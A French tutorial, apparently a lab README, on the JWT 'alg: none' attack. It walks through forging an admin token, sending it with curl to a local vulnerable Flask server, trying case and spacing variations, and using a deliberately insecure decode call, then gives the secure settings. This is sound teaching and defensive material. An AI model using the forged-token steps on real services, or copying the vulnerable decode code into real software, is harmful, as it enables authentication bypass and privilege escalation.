# Attaque JWT avec algorithme "none"

## Contexte

JSON Web Tokens (JWT) sont largement utilisés pour l'authentification dans les applications web modernes. Un JWT se compose de trois parties encodées en base64url :

```
header.payload.signature
```

Le header spécifie l'algorithme de signature utilisé (HS256, RS256, etc.). Cependant, la spécification JWT inclut un algorithme appelé "none", initialement prévu pour les tests.

## La vulnérabilité

Certaines implémentations JWT vulnérables acceptent l'algorithme "none", qui signifie "pas de vérification de signature". Un attaquant peut exploiter cette faille pour :

1. Prendre un JWT légitime
2. Décoder le header et le payload
3. Modifier le payload (ex: élever les privilèges)
4. Changer l'algorithme en "none"
5. Supprimer la signature
6. Le serveur accepte le token modifié sans vérification

## Anatomie d'un JWT

### JWT légitime avec HS256

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.xKAqKr5qXpXnGqVYGqPZqvqzxqXpXnGqVYGqPZqvqz
│                                      │                                                                   │
│                                      │                                                                   └─ Signature HMAC-SHA256
│                                      └───────────────────────────────────────────────────────────────────── Payload
└──────────────────────────────────────────────────────────────────────────────────────────────────────────── Header
```

**Header décodé:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload décodé:**
```json
{
  "user_id": 5,
  "username": "user",
  "role": "user"
}
```

### JWT forgé avec "none"

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
│                                      │                                                                   │
│                                      │                                                                   └─ Signature vide
│                                      └───────────────────────────────────────────────────────────────────── Payload modifié
└──────────────────────────────────────────────────────────────────────────────────────────────────────────── Header modifié
```

**Header décodé:**
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**Payload décodé:**
```json
{
  "user_id": 1,
  "username": "admin",
  "role": "admin"
}
```

## Démonstration pratique

### 1. Script d'attaque : `jwt_none_attack.py`

Ce script génère des JWT forgés avec l'algorithme "none" :

```bash
python3 jwt_none_attack.py
```

Le script :
- Décode un JWT légitime
- Modifie le payload (élévation de privilèges)
- Crée un nouveau JWT avec alg="none"
- Affiche différentes variations de l'attaque

### 2. Serveur vulnérable : `jwt_vulnerable_server.py`

Serveur Flask intentionnellement vulnérable qui accepte l'algorithme "none" :

```bash
python3 jwt_vulnerable_server.py
```

Le serveur démarre sur le port 5002 avec les endpoints :
- `POST /login` : Authentification
- `GET /admin` : Panel admin (vulnérable)
- `GET /profile` : Profil utilisateur (vulnérable)

**Code vulnérable:**
```python
# VULNÉRABLE
payload = jwt.decode(
    token,
    SECRET_KEY,
    algorithms=['HS256', 'none'],  # Accepte "none"
    options={"verify_signature": False}  # Pas de vérification
)
```

### 3. Serveur sécurisé : `jwt_secure_server.py`

Serveur Flask correctement sécurisé :

```bash
python3 jwt_secure_server.py
```

Le serveur démarre sur le port 5003 avec les mêmes endpoints, mais protégé.

**Code sécurisé:**
```python
# SÉCURISÉ
ALLOWED_ALGORITHMS = ['HS256']  # Whitelist

payload = jwt.decode(
    token,
    SECRET_KEY,
    algorithms=ALLOWED_ALGORITHMS,  # Uniquement HS256
    options={
        "verify_signature": True,  # Vérification obligatoire
        "verify_exp": True,
        "require": ["exp", "user_id", "role"]
    }
)
```

### 4. Script de test : `test_jwt_attack.py`

Script automatisé qui teste l'attaque sur les deux serveurs :

```bash
# Terminal 1
python3 jwt_vulnerable_server.py

# Terminal 2
python3 jwt_secure_server.py

# Terminal 3
python3 test_jwt_attack.py
```

## Méthodologie d'attaque complète

### Étape 1 : Obtenir un JWT légitime

```bash
curl -X POST http://localhost:5002/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"user","password":"password"}'
```

Réponse :
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo1..."
}
```

### Étape 2 : Décoder le JWT

Utiliser https://jwt.io ou le script Python :

```python
import base64
import json

def decode_jwt(token):
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload
```

### Étape 3 : Modifier le payload

```python
# Payload original
{
  "user_id": 5,
  "username": "user",
  "role": "user"
}

# Payload modifié (élévation de privilèges)
{
  "user_id": 1,
  "username": "admin",
  "role": "admin"
}
```

### Étape 4 : Créer un JWT forgé

```python
from jwt_none_attack import create_none_jwt

malicious_payload = {
    "user_id": 1,
    "username": "admin",
    "role": "admin"
}

forged_token = create_none_jwt(malicious_payload)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

### Étape 5 : Utiliser le token forgé

```bash
curl http://localhost:5002/admin \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.'
```

Réponse sur serveur vulnérable :
```json
{
  "message": "Welcome to admin panel!",
  "user": {
    "user_id": 1,
    "username": "admin",
    "role": "admin"
  }
}
```

## Impact de la vulnérabilité

Si un serveur accepte l'algorithme "none", un attaquant peut :

1. **Bypass complet de l'authentification**
   - Créer des sessions pour n'importe quel utilisateur
   - Pas besoin de connaître les mots de passe

2. **Élévation de privilèges**
   - Transformer un compte utilisateur en compte admin
   - Accéder à des fonctionnalités restreintes

3. **Manipulation de données**
   - Modifier n'importe quelle claim dans le JWT
   - Altérer l'identité, les rôles, les permissions

4. **Usurpation d'identité**
   - Se faire passer pour n'importe quel utilisateur
   - Effectuer des actions en son nom

## Variations de l'attaque

### Variation 1 : Casse différente

Certaines implémentations sont sensibles à la casse :

```json
{"alg": "none"}  // Minuscules
{"alg": "None"}  // Première majuscule
{"alg": "NONE"}  // Tout en majuscules
```

### Variation 2 : Avec ou sans signature vide

```
header.payload.        // Avec point final
header.payload         // Sans point final
```

### Variation 3 : Espaces dans l'algorithme

```json
{"alg": "none "}   // Espace après
{"alg": " none"}   // Espace avant
```

## Protection et bonnes pratiques

### 1. Whitelist d'algorithmes

```python
# MAUVAIS - Accepte tous les algorithmes
jwt.decode(token, secret)

# MAUVAIS - Inclut "none"
jwt.decode(token, secret, algorithms=['HS256', 'none'])

# BON - Whitelist stricte
ALLOWED_ALGORITHMS = ['HS256', 'RS256']
jwt.decode(token, secret, algorithms=ALLOWED_ALGORITHMS)
```

### 2. Vérification de signature obligatoire

```python
# MAUVAIS - Désactive la vérification
jwt.decode(token, options={"verify_signature": False})

# BON - Vérification activée (défaut)
jwt.decode(
    token,
    secret,
    algorithms=['HS256'],
    options={
        "verify_signature": True,
        "verify_exp": True
    }
)
```

### 3. Validation des claims

```python
# BON - Exiger des claims spécifiques
jwt.decode(
    token,
    secret,
    algorithms=['HS256'],
    options={
        "verify_signature": True,
        "verify_exp": True,
        "require": ["exp", "user_id", "role"]  # Claims requis
    }
)
```

### 4. Validation côté application

```python
def validate_token(token):
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=['HS256'],
            options={"verify_signature": True}
        )

        # Validations supplémentaires
        if payload.get('role') not in ['user', 'admin']:
            raise ValueError("Invalid role")

        if payload.get('user_id') <= 0:
            raise ValueError("Invalid user_id")

        return payload

    except jwt.InvalidTokenError:
        return None
```

### 5. Utiliser des bibliothèques à jour

```bash
# Mettre à jour PyJWT
pip install --upgrade PyJWT

# Vérifier la version
python3 -c "import jwt; print(jwt.__version__)"
```

Les versions récentes de PyJWT (>= 2.0.0) rejettent par défaut l'algorithme "none".

## Comparaison : Vulnérable vs Sécurisé

| Aspect | Serveur Vulnérable | Serveur Sécurisé |
|--------|-------------------|------------------|
| Algorithmes acceptés | `['HS256', 'none']` | `['HS256']` |
| Vérification signature | Désactivée | Activée |
| Vérification expiration | Non | Oui |
| Claims requis | Non | Oui (`exp`, `user_id`, `role`) |
| Risque | CRITIQUE | Protégé |
| Attaque "none" | Réussit | Bloquée |

## Historique de la vulnérabilité

Cette vulnérabilité a été découverte dans de nombreuses implémentations JWT :

- **2015** : Auth0 publie un article sur la vulnérabilité
- **2016** : Trouvée dans plusieurs bibliothèques Node.js
- **2017** : Affecte des bibliothèques Python, PHP, Java
- **2018+** : La plupart des bibliothèques modernes sont corrigées

Exemples de bibliothèques affectées (versions anciennes) :
- `node-jsonwebtoken` < 4.2.2
- `php-jwt` < 2.0.0
- `PyJWT` < 1.5.0

## Ressources

- [RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)
- [JWT.io](https://jwt.io) - Décodeur JWT en ligne
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Auth0 - Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

